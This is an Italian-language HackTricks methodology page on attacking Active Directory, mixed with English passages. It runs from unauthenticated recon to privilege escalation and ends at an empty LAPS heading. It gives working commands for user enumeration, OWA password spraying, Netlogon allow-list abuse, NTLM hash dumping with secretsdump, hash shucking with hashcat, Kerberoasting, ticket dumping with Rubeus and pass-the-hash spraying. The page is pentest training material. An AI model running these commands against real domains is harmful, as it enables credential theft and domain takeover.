# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Panoramica di base

**Active Directory** funge da tecnologia fondamentale, consentendo agli **network administrators** di creare e gestire efficientemente **domains**, **users** e **objects** all'interno di una rete. È progettato per scalare, facilitando l'organizzazione di un numero esteso di utenti in **groups** e **subgroups** gestibili, controllando al contempo i **access rights** a vari livelli.

La struttura di **Active Directory** è composta da tre livelli principali: **domains**, **trees** e **forests**. Un **domain** comprende una raccolta di oggetti, come **users** o **devices**, che condividono un database comune. I **trees** sono gruppi di questi domain collegati da una struttura condivisa, e una **forest** rappresenta la raccolta di più trees, interconnessi tramite **trust relationships**, formando il livello più alto della struttura organizzativa. Specifici diritti di **access** e di **communication** possono essere definiti a ciascuno di questi livelli.

I concetti chiave in **Active Directory** includono:

1. **Directory** – Contiene tutte le informazioni relative agli oggetti di Active Directory.
2. **Object** – Indica entità all'interno della directory, inclusi **users**, **groups** o **shared folders**.
3. **Domain** – Funge da contenitore per gli oggetti della directory, con la possibilità per più domain di coesistere all'interno di una **forest**, mantenendo ciascuno la propria raccolta di oggetti.
4. **Tree** – Un raggruppamento di domain che condividono un domain radice comune.
5. **Forest** – Il vertice della struttura organizzativa in Active Directory, composta da diversi trees con **trust relationships** tra loro.

**Active Directory Domain Services (AD DS)** comprende una gamma di servizi fondamentali per la gestione centralizzata e la comunicazione all'interno di una rete. Questi servizi includono:

1. **Domain Services** – Centralizza l'archiviazione dei dati e gestisce le interazioni tra **users** e **domains**, inclusi **authentication** e funzionalità di **search**.
2. **Certificate Services** – Sovrintende alla creazione, distribuzione e gestione di **digital certificates** sicuri.
3. **Lightweight Directory Services** – Supporta applicazioni abilitate alla directory tramite il **LDAP protocol**.
4. **Directory Federation Services** – Fornisce funzionalità di **single-sign-on** per autenticare gli utenti su più applicazioni web in una singola sessione.
5. **Rights Management** – Aiuta a proteggere materiale coperto da copyright regolando la sua distribuzione e il suo uso non autorizzati.
6. **DNS Service** – Fondamentale per la risoluzione dei **domain names**.

Per una spiegazione più dettagliata consulta: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Per imparare come **attack an AD** devi **understand** molto bene il **Kerberos authentication process**.\
[**Leggi questa pagina se ancora non sai come funziona.**](kerberos-authentication.md)

## Cheat Sheet

Puoi fare molto riferimento a [https://wadcoms.github.io/](https://wadcoms.github.io) per avere una rapida panoramica dei comandi che puoi eseguire per enumerare/exploitare un AD.

> [!WARNING]
> La comunicazione Kerberos **richiede un full qualifid name (FQDN)** per eseguire azioni. Se provi ad accedere a una macchina tramite indirizzo IP, **userà NTLM e non kerberos**.

## Recon Active Directory (No creds/sessions)

Se hai solo accesso a un ambiente AD ma non hai credenziali/sessioni, potresti:

- **Pentest the network:**
- Scansionare la rete, trovare macchine e porte aperte e provare a **exploit vulnerabilities** o **extract credentials** da esse (ad esempio, [le stampanti potrebbero essere target molto interessanti](ad-information-in-printers.md).
- L'enumerazione DNS potrebbe fornire informazioni su server chiave nel domain come web, printers, shares, vpn, media, ecc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dai un'occhiata alla [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) generale per trovare ulteriori informazioni su come fare questo.
- **Controlla l'accesso null e Guest sui servizi smb** (questo non funzionerà sulle versioni moderne di Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guida più dettagliata su come enumerare un server SMB può essere trovata qui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guida più dettagliata su come enumerare LDAP può essere trovata qui (presta **attenzione particolare all'accesso anonymous**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Raccogli credenziali [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accedi all'host [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Raccogli credenziali **esponendo** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Estrai username/names da documenti interni, social media, servizi (principalmente web) all'interno degli ambienti domain e anche da fonti pubblicamente disponibili.
- Se trovi i nomi completi dei dipendenti dell'azienda, potresti provare diverse **username conventions (**[**leggi questo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Le convenzioni più comuni sono: _NameSurname_, _Name.Surname_, _NamSur_ (3 lettere di ciascuno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettere casuali e 3 numeri casuali_ (abc123).
- Strumenti:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Controlla le pagine [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando viene richiesto un **invalid username** il server risponderà usando il codice di errore **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, consentendoci di determinare che lo username non era valido. Gli **valid usernames** restituiranno o il **TGT in a AS-REP** response oppure l'errore _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando che l'utente deve eseguire la pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contro l'interfaccia MS-NRPC (Netlogon) sui domain controller. Il metodo chiama la funzione `DsrGetDcNameEx2` dopo il binding dell'interfaccia MS-NRPC per verificare se l'utente o il computer esiste senza alcuna credenziale. Lo strumento [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa questo tipo di enumerazione. La ricerca può essere trovata [qui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se hai trovato uno di questi server nella rete puoi anche eseguire **user enumeration** contro di esso. Per esempio, puoi usare lo strumento [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puoi trovare liste di usernames in [**questo github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  e in questo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuttavia, dovresti avere il **nome delle persone che lavorano nell'azienda** dal passo di recon che avresti dovuto eseguire prima di questo. Con nome e cognome potresti usare lo script [**namemash.py**](https://gist.github.com/superkojiman/11076951) per generare potenziali usernames validi.

### Abuse dell'allow-list del canale vulnerabile di Netlogon (Onelogon)

Anche dopo che **Zerologon** è stato patchato sul DC, gli account esplicitamente allow-listed possono ancora essere esposti al comportamento **legacy/vulnerable del secure-channel di Netlogon**. La configurazione rischiosa è la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** o il valore di registro corrispondente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Quel valore è un **descriptor di sicurezza SDDL** (vedi [Security Descriptors](security-descriptors.md)). Qualsiasi account o gruppo a cui sia concessa la ACE rilevante nella DACL può essere targettato. Per esempio, `O:BAG:BAD:(A;;RC;;;WD)` allow-listha di fatto **Everyone**.

Workflow pratico dell'operatore:

1. **Identifica i principal allow-listed** controllando sia **SYSVOL/GPO** sia il **registro live del DC**.
2. **Risolvi gli SID** trovati nell'SDDL in utenti/computer reali di AD e dai priorità a **account macchina dei DC**, **trust accounts** e altri macchine privilegiate.
3. Prova ripetutamente l'autenticazione **MS-NRPC / Netlogon** come account allow-listed.
4. Dopo un tentativo riuscito, abuse del **Netlogon password-setting** per resettare la password dell'account target (il PoC pubblico la imposta a una stringa vuota).

Esempi rapidi di triage / lab dal public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- Lo **scanner** è utile perché l’allow-list effettiva può esistere in **SYSVOL**, nel **registry**, o in entrambi.
- Il percorso di exploit è importante perché **non richiede privilegi Domain Admin** una volta identificato un account vulnerabile.
- Compromettere un **Domain Controller machine account** come `DC$` è particolarmente pericoloso perché il reset di quella password può abilitare direttamente percorsi più ampi di **AD takeover**.
- La fattibilità del **brute-force** dipende dalla modalità: l’artifact pubblico descrive un approccio meet-in-the-middle, un brute force a **24-bit** quando è disponibile un altro computer account, e varianti più lente a **32-bit**.

Detection / hardening notes:

- Esegui audit della policy di allow-list e rimuovi tutto tranne eccezioni di compatibilità temporanee ed esplicitamente richieste.
- Monitora gli eventi **System** del DC **5827/5828/5829/5830/5831** per intercettare connessioni Netlogon vulnerabili negate, scoperte o esplicitamente consentite dalla policy.
- Tratta gli account in `VulnerableChannelAllowList` come **high-risk** finché la dipendenza legacy non viene rimossa.

### Knowing one or several usernames

Ok, quindi sai di avere già un username valido ma nessuna password... Allora prova:

- [**ASREPRoast**](asreproast.md): Se un user **non ha** l’attributo _DONT_REQ_PREAUTH_ puoi **richiedere un messaggio AS_REP** per quell’user che conterrà alcuni dati criptati con una derivazione della password dell’user.
- [**Password Spraying**](password-spraying.md): Proviamo le password più **comuni** con ciascuno degli utenti scoperti, magari qualche user sta usando una password debole (tieni presente la password policy!).
- Nota che puoi anche fare **spray sugli OWA servers** per provare ad accedere ai mail server degli utenti.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Potresti riuscire a **ottenere** alcuni challenge **hashes** da crackare **poisoning** alcuni protocolli della **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se sei riuscito a enumerare l’active directory avrai **più email e una migliore comprensione della network**. Potresti riuscire a forzare **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) per ottenere accesso all’AD env.

### NetExec workspace-driven recon & relay posture checks

- Usa i **`nxcdb` workspaces** per mantenere lo stato della recon AD per ogni engagement: `workspace create <name>` avvia DB SQLite per protocollo sotto `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia vista con `proto smb|mssql|winrm` ed elenca i secrets raccolti con `creds`. Elimina manualmente i dati sensibili quando hai finito: `rm -rf ~/.nxc/workspaces/<name>`.
- La discovery rapida della subnet con **`netexec smb <cidr>`** mostra **domain**, **OS build**, **SMB signing requirements** e **Null Auth**. I membri che mostrano `(signing:False)` sono **relay-prone**, mentre i DC spesso richiedono signing.
- Genera **hostnames in /etc/hosts** direttamente dall’output di NetExec per facilitare il targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando il **SMB relay verso il DC è bloccato** dalla signing, verifica comunque la postura **LDAP**: `netexec ldap <dc>` evidenzia `(signing:None)` / weak channel binding. Un DC con SMB signing richiesto ma LDAP signing disabilitato resta un target valido per **relay-to-LDAP** per abusi come **SPN-less RBCD**.

### Leak di credenziali printer lato client → validazione bulk delle credenziali di dominio

- Le UI di printer/web a volte **incorporano password admin mascherate in HTML**. Visualizzando il source/devtools si può recuperare il cleartext (ad esempio, `<input value="<password>">`), consentendo l’accesso Basic-auth per scandire/print repository.
- I print job recuperati possono contenere **documenti di onboarding in plaintext** con password per singolo utente. Mantieni gli abbinamenti allineati quando testi:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tratta ogni NT hash che possiedi già come password candidata per altri formati più lenti il cui materiale della chiave è derivato direttamente dall'NT hash. Invece di fare brute-force su passphrase lunghe in Kerberos RC4 tickets, NetNTLM challenges, o cached credentials, passi gli NT hash nelle modalità NT-candidate di Hashcat e lasci che validino il riuso delle password senza mai conoscere il plaintext. Questo è particolarmente efficace dopo un domain compromise, quando puoi raccogliere migliaia di NT hash attuali e storici.

Usa shucking quando:

- Hai un corpus NT da DCSync, dump SAM/SECURITY, o credential vaults e devi testare il reuse in altri domains/forests.
- Catturi materiale Kerberos basato su RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), risposte NetNTLM, o blob DCC/DCC2.
- Vuoi dimostrare rapidamente il reuse di passphrase lunghe e non crackabili e fare subito pivot via Pass-the-Hash.

La tecnica **non funziona** contro encryption types le cui chiavi non sono l'NT hash (per esempio, Kerberos etype 17/18 AES). Se un domain impone solo AES, devi tornare alle normali password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Usa `secretsdump.py` con history per ottenere il set più grande possibile di NT hash (e i loro valori precedenti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Le voci di history ampliano molto il candidate pool perché Microsoft può memorizzare fino a 24 hash precedenti per account. Per altri modi di raccogliere i secrets di NTDS vedi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) estrae i dati locali SAM/SECURITY e i logon di dominio in cache (DCC/DCC2). Elimina i duplicati e aggiungi quegli hash alla stessa lista `nt_candidates.txt`.
- **Track metadata** – Conserva username/domain che hanno prodotto ogni hash (anche se la wordlist contiene solo hex). Gli hash corrispondenti ti dicono subito quale principal sta riusando una password quando Hashcat stampa il candidato vincente.
- Preferisci candidati dallo stesso forest o da un forest trusted; massimizza la probabilità di overlap quando fai shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- Gli input NT-candidate **devono rimanere NT hash grezzi da 32 hex**. Disabilita i rule engines (niente `-r`, niente hybrid modes) perché le trasformazioni corrompono il materiale della chiave candidato.
- Queste modes non sono intrinsecamente più veloci, ma il keyspace NTLM (~30,000 MH/s su un M3 Max) è ~100× più rapido di Kerberos RC4 (~300 MH/s). Testare una lista NT curata costa molto meno che esplorare tutto lo spazio password nel formato lento.
- Esegui sempre la **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) perché i modes 31500/31600/35300/35400 sono stati rilasciati di recente.
- Al momento non esiste un NT mode per AS-REQ Pre-Auth, e gli etypes AES (19600/19700) richiedono la plaintext password perché le loro chiavi sono derivate via PBKDF2 da password UTF-16LE, non da NT hash grezzi.

#### Example – Kerberoast RC4 (mode 35300)

1. Cattura un TGS RC4 per un SPN target con un user a basso privilegio (vedi la pagina Kerberoast per i dettagli):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket con la tua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la chiave RC4 da ogni NT candidate e valida il blob `$krb5tgs$23$...`. Una corrispondenza conferma che l'account di servizio usa uno dei tuoi NT hash esistenti.

3. Fai subito pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Volendo, puoi recuperare il plaintext più tardi con `hashcat -m 1000 <matched_hash> wordlists/` se necessario.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons da una workstation compromessa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la riga DCC2 per l'utente di dominio interessante in `dcc2_highpriv.txt` e fai shucking:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una corrispondenza riuscita restituisce l'NT hash già noto nella tua lista, provando che l'utente in cache sta riusando una password. Usalo direttamente per PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oppure crackalo in modalità NTLM veloce per recuperare la stringa.

Lo stesso workflow si applica ai NetNTLM challenge-responses (`-m 27000/27100`) e a DCC (`-m 31500`). Una volta identificata una corrispondenza puoi avviare relay, SMB/WMI/WinRM PtH, oppure crackare di nuovo l'NT hash offline con masks/rules.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se sei riuscito a enumerare l'active directory avrai **più email e una migliore comprensione della rete**. Potresti essere in grado di forzare **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Ora che hai alcune credenziali di base dovresti verificare se riesci a **trovare** qualche **file interessante condiviso all'interno dell'AD**. Potresti farlo manualmente ma è un compito molto noioso e ripetitivo (e ancora di più se trovi centinaia di documenti che devi controllare).

[**Segui questo link per conoscere gli strumenti che potresti usare.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se puoi **accedere ad altri PC o share** potresti **posizionare file** (come un file SCF) che, se in qualche modo accessati, t**riggereranno un'autenticazione NTLM verso di te** così puoi **rubare** la **sfida NTLM** per craccarla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Questa vulnerabilità permetteva a qualsiasi utente autenticato di **compromettere il domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Per le seguenti tecniche un normale utente di dominio non basta, servono privilegi/credenziali speciali per eseguire questi attacchi.**

### Hash extraction

Sperabilmente sei riuscito a **compromettere qualche account di local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluso il relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilegi localmente](../windows-local-privilege-escalation/index.html).\
Poi è il momento di dumpare tutti gli hash in memoria e localmente.\
[**Leggi questa pagina sui diversi modi per ottenere gli hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una volta che hai l'hash di un utente**, puoi usarlo per **impersonarlo**.\
Devi usare qualche **tool** che **esegua** l'**autenticazione NTLM usando** quell'**hash**, **oppure** potresti creare un nuovo **sessionlogon** e **iniettare** quell'**hash** dentro **LSASS**, così quando viene eseguita qualsiasi **autenticazione NTLM**, verrà usato quell'**hash**. L'ultima opzione è ciò che fa mimikatz.\
[**Leggi questa pagina per maggiori informazioni.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Questo attacco mira a **usare l'hash NTLM dell'utente per richiedere ticket Kerberos**, come alternativa al comune Pass The Hash sul protocollo NTLM. Pertanto, potrebbe essere particolarmente **utile in reti in cui il protocollo NTLM è disabilitato** e solo **Kerberos è consentito** come protocollo di autenticazione.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Nel metodo di attacco **Pass The Ticket (PTT)**, gli attacker **rubano il ticket di autenticazione di un utente** invece della sua password o dei valori hash. Questo ticket rubato viene poi usato per **impersonare l'utente**, ottenendo accesso non autorizzato a risorse e servizi all'interno di una rete.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se hai l'**hash** o la **password** di un **amministratore locale** dovresti provare a fare **login localmente** su altri **PC** con esso.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Nota che questo è piuttosto **noisy** e **LAPS** lo **mitigherebbe**.

### MSSQL Abuse & Trusted Links

Se un utente ha privilegi per **accedere a istanze MSSQL**, potrebbe essere in grado di usarle per **eseguire comandi** sull'host MSSQL (se in esecuzione come SA), **rubare** l'hash **NetNTLM** o persino eseguire un **relay attack**.\
Inoltre, se un'istanza MSSQL è trusted (database link) da un'altra istanza MSSQL. Se l'utente ha privilegi sul database trusted, sarà in grado di **usare la relazione di trust per eseguire query anche nell'altra istanza**. Questi trust possono essere concatenati e, a un certo punto, l'utente potrebbe trovare un database misconfigurato dove può eseguire comandi.\
**I link tra database funzionano anche attraverso forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Le suite di inventario e deployment di terze parti spesso espongono percorsi potenti verso credenziali ed esecuzione di codice. Vedi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se trovi un oggetto Computer con l'attributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e hai privilegi di dominio sul computer, sarai in grado di fare dump dei TGT dalla memoria di tutti gli utenti che effettuano login sul computer.\
Quindi, se un **Domain Admin effettua login sul computer**, sarai in grado di fare dump del suo TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Grazie alla constrained delegation potresti persino **compromettere automaticamente un Print Server** (sperabilmente sarà un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se a un utente o a un computer è consentita la "Constrained Delegation", sarà in grado di **impersonare qualsiasi utente per accedere ad alcuni servizi in un computer**.\
Quindi, se **comprometti l'hash** di questo utente/computer sarai in grado di **impersonare qualsiasi utente** (anche domain admin) per accedere ad alcuni servizi.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avere il privilegio **WRITE** su un oggetto Active Directory di un computer remoto consente di ottenere esecuzione di codice con **privilegi elevati**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utente compromesso potrebbe avere alcuni **privilegi interessanti su alcuni oggetti di dominio** che potrebbero permetterti di **muoverti** lateralmente/**escalare** privilegi.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Scoprire un **servizio Spool in ascolto** all'interno del dominio può essere **abusato** per **ottenere nuove credenziali** ed **escalare privilegi**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **altri utenti** **accedono** alla macchina **compromessa**, è possibile **recuperare credenziali dalla memoria** e persino **iniettare beacon nei loro processi** per impersonarli.\
Di solito gli utenti accederanno al sistema via RDP, quindi qui hai come eseguire un paio di attacchi sulle sessioni RDP di terze parti:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

